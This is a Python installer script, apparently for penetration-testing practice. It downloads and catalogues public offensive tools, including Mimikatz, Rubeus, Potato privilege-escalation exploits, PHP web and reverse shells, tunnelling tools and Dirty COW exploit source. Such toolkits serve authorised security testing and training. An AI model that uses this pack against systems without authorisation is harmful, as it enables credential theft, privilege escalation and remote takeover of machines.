#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF COMPUTER NETWORKS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Load any required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import shutil
import os.path

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Create functional subroutines to be called from main.
# Modified: N/A
# -------------------------------------------------------------------------------------

def print_no_newline(string):
    import sys
    sys.stdout.write(string)
    sys.stdout.flush()
    return

def bar():
   print_no_newline('⬜')
   return

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Display banner.
# Modified: N/A
# -------------------------------------------------------------------------------------

os.system("clear")
print("\t\t\t\t ____   ___   ____ _   _ _____      _    ____ _____ _   _ _____   ")
print("\t\t\t\t|  _ \ / _ \ / ___| | | | ____|    / \  / ___| ____| \ | |_   _|  ")
print("\t\t\t\t| |_) | | | | |  _| | | |  _|     / _ \| |  _|  _| |  \| | | |    ")
print("\t\t\t\t|  _ <| |_| | |_| | |_| | |___   / ___ \ |_| | |___| |\  | | |    ")
print("\t\t\t\t|_| \_\\\\___/ \____|\___/|_____| /_/   \_\____|_____|_| \_| |_|  ") 
print("\t\t\t\t                                                                  ")
print("\t\t\t\t      BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)    \n\n")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : MAIN - Download windows and linux exploits.
# Modified: N/A
# -------------------------------------------------------------------------------------

print("[*] Installing treadstone exploit pack, please wait...\n")
print("    _______________________________________________ PROGRESS BAR _____________________________________________________")
print_no_newline("    ")
if not os.path.exists("TREADSTONE"):
   os.system("mkdir TREADSTONE"); bar()
os.chdir("TREADSTONE"); bar()
os.system("wget https://download.sysinternals.com/files/Procdump.zip -O Procdump.zip > log.tmp 2>&1"); bar()
os.system("unzip Procdump.zip >> log.tmp 2>&1"); bar()
if os.path.exists("Procdump.zip"):
   os.remove("Procdump.zip"); bar()
os.remove("Eula.txt"); bar()
os.remove("procdump64a.exe"); bar()
os.system("wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O winpeas64.exe >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O winpeas32.exe >> log.tmp 2>&1"); bar()
#os.system("wget 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe' -O sharphound.exe >> log.tmp 2>&1")
#os.system("wget 'https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1' -O sharphound.ps1 >> log.tmp 2>&1")
os.system("git clone https://github.com/TsukiCTF/Lovely-Potato.git >> log.tmp 2>&1"); bar()
os.system("mv ./Lovely-Potato/Invoke-LovelyPotato.ps1 ./lovelypotato.ps1 >> log.tmp 2>&1"); bar()
os.system("mv ./Lovely-Potato/JuicyPotato-Static.exe ./juicypotato.exe >> log.tmp 2>&1"); bar()
os.system("mv ./Lovely-Potato/test_clsid.bat ./ >> log.tmp 2>&1"); bar()
os.remove("./Lovely-Potato/README.md"); bar()
shutil.rmtree("Lovely-Potato"); bar()
os.system("wget 'https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip' -O RoguePotato.zip >> log.tmp 2>&1"); bar()
os.system("unzip RoguePotato.zip >> log.tmp 2>&1"); bar()
os.remove("RoguePotato.zip"); bar()
os.system("mv ./RogueOxidResolver.exe ./rogueoxidresolver.exe >> log.tmp 2>&1"); bar()
os.system("mv ./RoguePotato.exe ./roguepotato.exe >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1' -O jawsenum.ps1 >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/besimorhino/powercat/raw/master/powercat.ps1' -O powercat.ps1 >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/HarmJ0y/PowerUp/raw/master/PowerUp.ps1' -O powerup.ps1 >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/S3cur3Th1sSh1t/WinPwn/raw/master/WinPwn.ps1' -O winpwn.ps1 >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Out-Minidump.ps1' -O mimidump.ps1 >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1' -O mimilatz.ps1 >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1' -O powerview.ps1 >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/Kevin-Robertson/Powermad/raw/master/Powermad.ps1' -O powermad.ps1 >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_amd64.gz' -O chisel.gz >> log.tmp 2>&1"); bar()
os.system("gunzip chisel.gz"); bar()
os.system("mv chisel chisel64.exe >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_386.gz' -O chisel.gz >> log.tmp 2>&1"); bar()
os.system("gunzip chisel.gz"); bar()
os.system("mv chisel chisel32.exe >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe' -O rubeus.exe >> log.tmp 2>&1"); bar()
os.system("wget 'https://nmap.org/dist/nmap-7.80-setup.exe' -O nmapsetup.exe >> log.tmp 2>&1"); bar()
os.system("cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe >> log.tmp 2>&1"); bar()
os.system("cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe >> log.tmp 2>&1"); bar()
os.system("cp /usr/share/windows-resources/binaries/nc.exe nc64.exe >> log.tmp 2>&1"); bar()
os.system("cp /usr/share/windows-resources/binaries/plink.exe plink64.exe >> log.tmp 2>&1"); bar()
os.system("wget 'https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php' -O webshell.php >> log.tmp 2>&1"); bar()
os.system("wget 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -O myshell.php >> log.tmp 2>&1"); bar()
os.system("wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh' -O linenum.sh >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh' -O linenumplus.sh >> log.tmp 2>&1"); bar()
os.system("wget 'https://raw.githubusercontent.com/Adlemann/linPE/master/linpe.sh' -O linpe.sh >> log.tmp 2>&1"); bar()
os.system("wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O linpeas.sh >> log.tmp 2>&1"); bar()
os.system("wget 'https://raw.githubusercontent.com/Arr0way/linux-local-enumeration-script/master/linux-local-enum.sh' -O coffee.sh >> log.tmp 2>&1"); bar()
os.system("wget 'https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php' -O webshell.php >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32' -O pspy32 >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64' -O pspy64 >> log.tmp 2>&1"); bar()
os.system("wget 'https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.4.0-31-generic/CVE-2016-5195/compile.sh' -O naughtycowcompile.sh >> log.tmp 2>&1"); bar()
os.system("wget 'https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.4.0-31-generic/CVE-2016-5195/naughtyc0w.c' -O naughthycow.c >> log.tmp 2>&1"); bar()
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_linux_amd64.gz' -O chisel_1.7.2_linux_amd64.gz >> log.tmp 2>&1"); bar()
os.system("gzip -d chisel_1.7.2_linux_amd64.gz >> log.tmp 2>&1"); bar()
os.system("mv chisel_1.7.2_linux_amd64 chisel.linux64 >> log.tmp 2>&1"); bar()
with open("treadstone.txt", "w") as treadstone:
   treadstone.write("\t\t _____ ____  _____    _    ____  ____ _____ ___  _   _ _____     \n")
   treadstone.write("\t\t|_   _|  _ \| ____|  / \  |  _ \/ ___|_   _/ _ \| \ | | ____|    \n")
   treadstone.write("\t\t  | | | |_) |  _|   / _ \ | | | \___ \ | || | | |  \| |  _|      \n")
   treadstone.write("\t\t  | | |  _ <| |___ / ___ \| |_| |___) || || |_| | |\  | |___     \n")
   treadstone.write("\t\t  |_| |_| \_\_____/_/   \_\____/|____/ |_| \___/|_| \_|_____|    \n")                                                               
   treadstone.write("\t\t                                                                 \n")
   treadstone.write("\t\t      BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)      \n")
   treadstone.write("                                                                     \n")
   treadstone.write("ENUMERATION\t\tSHELLS\t\t\tRUNNING PROCESSES\t\tCOMMUNICATIONS\t\tCORE EXPLOITS\n")
   treadstone.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
   treadstone.write("jawsenum.ps1\t\tmeterpreter.exe\t\tpowerup.ps1\t\t\tnc64.exe\t\tmimidump.ps1\n")
   treadstone.write("sharphound.ps1\t\twebshell.php\t\tpowercat.ps\t\t\tplink64.exe\t\tmimikatz.ps1\n")
   treadstone.write("sharphound.exe\t\tmyshell.php\t\tpowerview.ps1\t\t\tchisel64.exe\t\twinpwn.ps1\n")
   treadstone.write("winpeas32.exe\t\timage.php.jpg\t\tpowermad.ps1\t\t\ttest_clsid.bat\t\tlovelypotato.ps1\n")
   treadstone.write("winpeas64.exe\t\t\t\t\tprocdump32.exe\t\t\trogueoxidresolver.exe\troguepotato.exe\n")
   treadstone.write("rubeus.exe\t\t\t\t\tprocdump64.exe\t\t\t\t\t\tmimikatz64.exe\n")
   treadstone.write("nmapsetup.exe\t\t\t\t\t\t\t\t\t\t\t\tmimikatz32.exe\n")
   treadstone.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
   treadstone.write("coffee.sh\t\tlinpayload.elf\t\tpspy32\t\t\t\t\t\t\tnaughtycowcompile.sh\n")
   treadstone.write("linpeas.sh\t\twebshell.php\t\tpspy64\t\t\t\t\t\t\tnaughycow.c\n")
   treadstone.write("linenum.sh\n")
   treadstone.write("linenumplus.sh\n")
   treadstone.write("linpe.sh\n")
   treadstone.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
bar()
os.chdir(".."); bar()
print("\n\n[+] Treadstone exploit pack successfully installed...")
#Eof
